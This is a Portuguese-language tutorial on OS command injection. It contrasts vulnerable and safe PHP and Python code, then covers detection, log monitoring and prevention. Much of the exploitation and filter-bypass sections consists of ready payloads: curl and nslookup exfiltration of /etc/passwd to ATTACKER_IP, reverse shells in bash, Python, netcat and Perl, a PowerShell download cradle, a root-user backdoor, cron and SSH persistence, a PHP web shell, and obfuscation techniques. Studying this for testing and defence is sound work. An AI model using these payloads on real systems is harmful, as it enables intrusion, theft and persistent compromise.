---
title: "Command Injection"
---

# Command Injection — Injeção de Comandos no Sistema Operacional

## A Falha: Input do Usuário Executado como Comando do Sistema Operacional

Command Injection acontece quando uma aplicação passa dados fornecidos pelo usuário diretamente para uma função de execução de sistema operacional — como `system()`, `exec()`, `subprocess.call()` ou `Runtime.exec()` — sem separar dados de instrução.

A suposição de design incorreta é simples: o desenvolvedor trata a entrada do usuário como um *valor*, mas o shell a interpreta como *código*. O shell não distingue entre a parte do comando que o desenvolvedor escreveu e a parte que o usuário forneceu. Para ele, tudo é uma string a ser interpretada.

**Por que o desenvolvedor cria essa falha**: a aplicação precisa executar um comando de sistema (ping, whois, dig, convert) e a forma mais rápida de incluir o input do usuário é por concatenação de string. O dev pensa em `"ping -c 3 " + ip` como uma chamada utilitária, não como uma fronteira de segurança onde o input poderia subverter a instrução inteira.

**Consequência real**: o atacante executa comandos arbitrários no servidor com os privilégios do processo web — leitura de arquivos sensíveis, exfiltração de dados, pivot para rede interna, instalação de backdoors, comprometimento total do servidor. Em ambientes cloud, a vulnerabilidade pode levar ao roubo de credenciais IAM via metadata endpoints.

---

## Causa Raiz

O shell interpreta metacaracteres como operadores, não como dados. Quando o input do usuário contém `;`, `&&`, `|`, `$()` ou `` ` ``, esses caracteres encerram o comando original e iniciam um novo.

```php
// VULNERÁVEL — concatenação direta
$ip = $_GET['ip'];
system("ping -c 3 " . $ip);
// Input: "127.0.0.1; whoami"
// Shell executa: ping -c 3 127.0.0.1 ; whoami
// O shell interpreta o ";" como separador de comandos
```

O que está faltando: separação entre o comando (definido pelo desenvolvedor) e os dados (fornecidos pelo usuário). Existem duas formas corretas de fazer isso:

```php
// SEGURO — opção 1: escapar o input para uso em shell
$ip = escapeshellarg($_GET['ip']);
system("ping -c 3 " . $ip);
// escapeshellarg() envolve o valor em aspas simples e escapa aspas internas
// Input "127.0.0.1; whoami" vira '127.0.0.1; whoami' — tratado como dado, não código

// SEGURO — opção 2: validar com whitelist antes de qualquer execução
if (!preg_match('/^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$/', $_GET['ip'])) {
    die("IP inválido");
}
system("ping -c 3 " . $_GET['ip']);

// IDEAL — opção 3: usar API nativa sem shell
// Em vez de system("ping ..."), usar socket_connect() diretamente
```

```python
# VULNERÁVEL — shell=True com concatenação
import subprocess
ip = request.args.get('ip')
subprocess.call("ping -c 3 " + ip, shell=True)
# shell=True faz Python invocar /bin/sh, que interpreta metacaracteres

# SEGURO — lista de argumentos sem shell
subprocess.call(["ping", "-c", "3", ip])
# Quando shell=False (padrão), os argumentos são passados diretamente ao kernel
# O shell não é invocado — metacaracteres não têm significado especial

# SEGURO — validar antes
import re
if not re.match(r'^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$', ip):
    raise ValueError("IP inválido")
subprocess.call(["ping", "-c", "3", ip])
```

A vulnerabilidade existe em qualquer linguagem: PHP com `system()`, `exec()`, `shell_exec()`, `passthru()`; Python com `os.system()`, `subprocess.call(shell=True)`; Node.js com `child_process.exec()`; Java com `Runtime.getRuntime().exec()` quando a string é construída por concatenação.

---

## Como o Ataque Funciona

### Mecanismo Básico

O atacante envia `127.0.0.1; whoami`. O servidor executa dois comandos em sequência. O resultado do `whoami` aparece na resposta.

### Operadores de Encadeamento

```bash
# Ponto e vírgula — executa ambos independente de erro
127.0.0.1; whoami

# AND lógico — executa segundo só se primeiro suceder
127.0.0.1 && whoami

# OR lógico — executa segundo só se primeiro falhar
127.0.0.1 || whoami

# Pipe — passa stdout do primeiro como stdin do segundo
127.0.0.1 | whoami

# Substituição de comando — executa e substitui inline
127.0.0.1 $(whoami)
127.0.0.1 `whoami`

# Newline — funciona como ponto e vírgula
127.0.0.1%0awhoami
```

### Contexto de Execução

O servidor interpreta o comando no shell padrão (geralmente `/bin/sh` ou `/bin/bash` no Linux; `cmd.exe` ou `powershell` no Windows). O atacante deve conhecer o OS alvo para adaptar os payloads.

---

## Identificação

### Detecção Direta (Output Visível)

```bash
# Injetar após um valor legítimo
127.0.0.1; id
127.0.0.1 && id
127.0.0.1 | id

# Testar com comando simples
; whoami
& whoami
| whoami
`id`
$(id)
```

Se a resposta contiver `uid=` ou o nome de usuário, confirmação direta.

### Detecção por Tempo (Blind Injection)

Quando não há output visível, usar `sleep` para medir latência:

```bash
# Linux — sleep 5 segundos
127.0.0.1; sleep 5
127.0.0.1 && sleep 5
127.0.0.1 | sleep 5
$(sleep 5)
`sleep 5`

# Windows — ping loop como sleep
127.0.0.1 & ping -n 5 127.0.0.1
```

Se a resposta demorar exatamente 5 segundos, a injeção funciona.

### Detecção Out-of-Band (OOB)

Para ambientes totalmente cegos, forçar conexão de saída:

```bash
# DNS callback via nslookup
127.0.0.1; nslookup $(whoami).BURP_COLLABORATOR_URL

# HTTP callback via curl
127.0.0.1; curl http://ATTACKER_IP/?output=$(id)

# Exfiltrar arquivo via HTTP
127.0.0.1; curl "http://ATTACKER_IP/?data=$(cat /etc/passwd | base64 -w 0)"
```

### Árvore de Decisão para Confirmação

```
INPUT FIELD IDENTIFICADO
        |
        v
Testar: '; sleep 5 #
        |
    Delay ocorreu?
   /              \
  SIM              NAO
   |                 |
Command Injection  Testar: $(sleep 5)
Confirmada!          |
                  Delay ocorreu?
                 /              \
               SIM               NAO
                |                  |
           Confirmada!           Testar outros
                                 operadores e
                                 contextos
```

### Pontos de Entrada Comuns

Campos a testar: endereços IP, hostnames, nomes de arquivos, parâmetros de busca, campos de email, User-Agent, funcionalidades de ping/traceroute/whois, geração de relatórios, ferramentas de diagnóstico administrativo.

---

## Exploitation

### Reconhecimento Inicial

```bash
# Identificar usuário e contexto
; id
; whoami
; id; hostname; uname -a

# Listar arquivos
; ls -la /
; ls -la /home/
; ls -la /var/www/

# Ler arquivos sensíveis
; cat /etc/passwd
; cat /etc/shadow
; cat /etc/hosts

# Verificar privilégios sudo
; sudo -l

# Descobrir arquivos de configuração
; find / -name "config.php" 2>/dev/null
; find / -name ".env" 2>/dev/null

# Obter variáveis de ambiente
; env
; printenv
```

### Exfiltração de Dados (Blind)

```bash
# Escrever output em arquivo acessível via web
; id > /var/www/html/output.txt
# Acessar: http://TARGET/output.txt

# Exfiltrar via DNS
; nslookup $(cat /etc/passwd | base64 | head -c 50).attacker.com

# Exfiltrar via HTTP com base64
; curl "http://ATTACKER_IP/?d=$(cat /etc/passwd | base64 -w 0)"

# Time-based bit a bit
; if [ $(cat /etc/passwd | cut -c1) = 'r' ]; then sleep 5; fi
```

### Reverse Shell

```bash
# Bash reverse shell
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python reverse shell
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat reverse shell (sem -e)
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f

# Perl reverse shell
; perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Windows Exploitation

```batch
REM CMD payloads
127.0.0.1 & whoami
127.0.0.1 && net user
127.0.0.1 | dir C:\

REM PowerShell download cradle
127.0.0.1 & powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"

REM Exfiltrar arquivo
127.0.0.1 & type C:\Windows\System32\drivers\etc\hosts
127.0.0.1 & certutil -encode C:\secret.txt %temp%\enc.txt & type %temp%\enc.txt
```

### Escalação de Privilégios Pós-Exploit

```bash
# SUID binaries
; find / -perm -u=s -type f 2>/dev/null

# Writeable crontabs
; ls -la /etc/cron*
; cat /etc/crontab

# Writeable /etc/passwd
; ls -la /etc/passwd
; echo "hacker:$(openssl passwd -1 pass123):0:0:root:/root:/bin/bash" >> /etc/passwd

# Sudo sem senha
; sudo -u root /bin/bash

# Capabilities
; getcap -r / 2>/dev/null
```

### Persistência

```bash
# Adicionar crontab
; (crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1") | crontab -

# Adicionar chave SSH
; mkdir -p ~/.ssh; echo "ATTACKER_PUBLIC_KEY" >> ~/.ssh/authorized_keys

# Criar backdoor PHP
; echo "<?php system(\$_GET['cmd']); ?>" > /var/www/html/shell.php
```

---

## Bypass de Filtros

### Bypass de Filtro de Espaços

```bash
# IFS (Internal Field Separator) — Linux
cat${IFS}/etc/passwd
cat${IFS}/etc${IFS}passwd
{cat,/etc/passwd}

# Tab como separador (URL-encoded)
cat%09/etc/passwd

# Redirecionamento como separador
cat</etc/passwd

# Brace expansion sem espaco
{ls,-la,/}
```

### Bypass de Blacklist de Comandos

```bash
# Inserir aspas no meio do comando (ignoradas pelo shell)
w'h'o'a'm'i
w"h"o"a"m"i

# Backslash no meio do comando
w\ho\am\i
wh\oami

# Variavel posicional vazia
who$@ami

# Concatenacao de variaveis
c='ca'; t='t'; $c$t /etc/passwd

# Base64 com pipe
bash<<<$(base64 -d<<<d2hvYW1p)
echo d2hvYW1p | base64 -d | bash
```

### Bypass de Caracteres Especificos

```bash
# Bypass de newline URL-encoded
127.0.0.1%0awhoami

# Bypass de pipe URL-encoded
127.0.0.1%7cwhoami

# Bypass de ampersand URL-encoded
127.0.0.1%26whoami

# Bypass de barra — usando variaveis de ambiente
echo ${PATH:0:1}   # retorna /
cat ${PATH:0:1}etc${PATH:0:1}passwd
```

### Ofuscacao Avancada (Linux)

```bash
# Inversao de comando com rev
$(rev<<<'imaohw')

# Manipulacao de case com tr
$(tr '[A-Z]' '[a-z]'<<<'WHOAMI')

# Base64 encoding completo
bash -c {echo,Y2F0IC9ldGMvcGFzc3dk}|{base64,-d}|bash

# Multiplos niveis de encoding
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)
```

### Ofuscacao Avancada (Windows)

```batch
REM Inserir caret no meio do comando — ignorado pelo CMD
wh^oami
w^ho^am^i

REM PowerShell com encoding Base64
powershell -enc [BASE64_ENCODED_COMMAND]

REM FOR loop para execucao ofuscada
FOR /F "tokens=1" %i IN ('whoami') DO echo %i
```

### Ferramenta: Bashfuscator

```bash
# Instalacao
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator && pip3 install . --user

# Uso basico
bashfuscator -c 'cat /etc/passwd'

# Payload compacto com uma camada
bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

# Payload ultra-compacto
bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling -q
```

---

## Detecção e Mitigação

### Indicadores de Comprometimento (IoC)

- Processos filhos inesperados de processos web (apache, nginx, php-fpm)
- Conexões de saída de processos web para IPs externos na internet
- Arquivos criados em `/tmp`, `/var/tmp`, `/dev/shm` por processos web
- Execução de `/bin/bash`, `python`, `perl`, `nc` por processos web
- Acesso a `/etc/passwd`, `/etc/shadow` por processos web
- Consultas DNS com subdomínios aleatórios longos (OOB exfiltration)

### Logs a Monitorar

```bash
# Apache/Nginx — patterns suspeitos nos logs
grep -E "(\;|\||\&|`|\$\()" /var/log/apache2/access.log
grep -E "(whoami|id|cat /etc|/bin/bash|nc)" /var/log/apache2/access.log

# Caracteres URL-encoded suspeitos
grep -E "%0a|%7c|%26|%60|%24%28" /var/log/nginx/access.log

# Auditd — monitorar chamadas de sistema
auditctl -a always,exit -F arch=b64 -S execve -k command_injection
```

### Prevenção

**Regras de prevenção:**
1. Nunca passar input de usuário para funções de shell
2. Usar APIs nativas da linguagem em vez de comandos de shell
3. Se shell for necessário: escapar com funções apropriadas (`escapeshellarg`, `shlex.quote`)
4. Implementar whitelist de caracteres permitidos
5. Executar o processo web com mínimos privilégios (não root)
6. Usar WAF com regras para command injection
7. Sandboxing: containers, seccomp, AppArmor para limitar syscalls disponíveis

---

## Módulos Relacionados

Command Injection compartilha com SSTI a mesma lógica fundamental: input do usuário percorre um caminho até um sink que o interpreta como código executável, não como dado. File Inclusion segue o mesmo princípio no eixo de controle de execução — o atacante determina qual código o servidor carrega e executa via input controlado. SSRF se distingue porque o atacante controla o *destino* de uma operação do servidor (para onde ele faz uma requisição), não o comando executado no OS. Referências normativas: OWASP Top 10 A03:2021 — Injection; CWE-78: Improper Neutralization of Special Elements used in an OS Command.
